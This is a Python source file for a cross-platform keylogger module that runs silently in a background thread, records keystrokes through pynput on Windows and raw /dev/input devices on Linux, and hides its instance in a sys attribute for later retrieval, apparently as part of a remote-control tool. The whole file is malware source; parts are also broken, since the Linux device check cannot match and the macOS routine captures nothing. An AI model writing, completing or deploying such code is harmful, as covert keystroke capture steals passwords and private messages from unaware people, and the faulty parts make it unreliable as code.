# Keylogger Module
import platform
import threading
import time
import os
from pathlib import Path
from collections import deque

class Keylogger:
    def __init__(self, interval=5, max_keys=10000):
        self.interval = interval
        self.max_keys = max_keys
        self.keys = deque(maxlen=max_keys)
        self.running = False
        self.platform = platform.system()
        self.thread = None
        self.last_keys = []
        
    def start(self):
        """Start the keylogger"""
        if self.running:
            return {"success": False, "message": "Keylogger already running"}
        
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        
        return {"success": True, "message": f"Keylogger started (platform: {self.platform})"}
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
        return {"success": True, "message": "Keylogger stopped"}
    
    def get_keys(self, clear=True):
        """Get captured keys"""
        keys = list(self.keys)
        if clear:
            self.keys.clear()
        return {"success": True, "keys": "".join(keys), "count": len(keys)}
    
    def _loop(self):
        """Main keylogger loop"""
        if self.platform == "Windows":
            self._windows_loop()
        elif self.platform == "Linux":
            self._linux_loop()
        elif self.platform == "Darwin":
            self._mac_loop()
    
    def _windows_loop(self):
        """Windows keylogger using pynput"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    key_char = key.char
                    if key_char:
                        self.keys.append(key_char)
                except AttributeError:
                    if key == keyboard.Key.space:
                        self.keys.append(" ")
                    elif key == keyboard.Key.enter:
                        self.keys.append("\n")
                    else:
                        self.keys.append(f"<{key.name}>")
            
            with keyboard.Listener(on_press=on_press) as listener:
                while self.running:
                    listener.wait(1)
        except ImportError:
            # Fallback: read from console
            while self.running:
                try:
                    import msvcrt
                    if msvcrt.kbhit():
                        key = msvcrt.getch().decode()
                        self.keys.append(key)
                except:
                    pass
                time.sleep(0.1)
    
    def _linux_loop(self):
        """Linux keylogger using evdev or X11"""
        try:
            from evdev import InputDevice, categorize, ecodes
            import glob
            
            devices = [InputDevice(path) for path in glob.glob('/dev/input/event*') 
                      if 'Keyboard' in InputDevice(path).capabilities.keys()]
            
            if not devices:
                raise Exception("No keyboard devices found")
            
            for device in devices:
                while self.running:
                    try:
                        for event in device.read_loop(timeout=0.1):
                            if event.type == ecodes.EV_KEY and event.value == 1:
                                key = categorize(event)
                                if key.keysym and key.keysym != 'unknown':
                                    self.keys.append(key.text if hasattr(key, 'text') else str(key.keysym))
                    except:
                        break
        except ImportError:
            # Fallback: use xdotool or read /dev/input/event*
            while self.running:
                try:
                    import subprocess
                    result = subprocess.run(['xdotool', 'getactivewindow'], capture_output=True, text=True)
                    # This is a simplified fallback
                except:
                    pass
                time.sleep(1)
    
    def _mac_loop(self):
        """macOS keylogger using Quartz"""
        try:
            from AppKit import NSEvent, NSLocalNotification
            from Foundation import NSRunLoop, NSDictionary
            
            while self.running:
                event = NSEvent.mouseEventWithType_location_modifierFlags_timestamp_windowNumber_context_subtype_data1_data2_(
                    25, (0, 0), 0, 0, 0, None, 0, 0, 0
                )
                time.sleep(0.1)
        except:
            while self.running:
                time.sleep(1)


def start_keylogger(interval=5):
    """Start keylogger and return instance"""
    kl = Keylogger(interval=interval)
    result = kl.start()
    if result["success"]:
        # Store globally for later retrieval
        import sys
        sys._rs_keylogger = kl
    return result


def get_keylog(clear=True):
    """Get captured keylog"""
    import sys
    if hasattr(sys, '_rs_keylogger'):
        return sys._rs_keylogger.get_keys(clear)
    return {"success": False, "message": "Keylogger not running"}


def stop_keylogger():
    """Stop keylogger"""
    import sys
    if hasattr(sys, '_rs_keylogger'):
        return sys._rs_keylogger.stop()
    return {"success": False, "message": "Keylogger not running"}
